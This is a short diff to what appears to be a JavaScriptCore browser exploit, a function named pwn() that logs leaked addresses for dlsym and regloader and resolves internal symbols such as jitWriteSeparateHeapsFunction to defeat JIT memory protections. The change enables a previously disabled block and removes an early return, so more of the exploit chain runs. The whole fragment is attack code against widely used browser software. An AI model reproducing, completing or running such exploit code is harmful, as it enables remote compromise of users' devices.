@@ -501,7 +501,7 @@ function pwn() {
     log(`[+] dlsym: ${dlsym_addr}`);
 
     //TEMPORARY DISABLED START
-    var temp_disabled = true;
+    var temp_disabled = false;
     if(!temp_disabled) {
     var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
     log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
@@ -687,16 +687,6 @@ function pwn() {
         try_count++;
     }
     log(`[+] regloader: ${regloader}`);
-
-
-
-
-
-
-    return;
-
-
-
 
     //fail
     // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
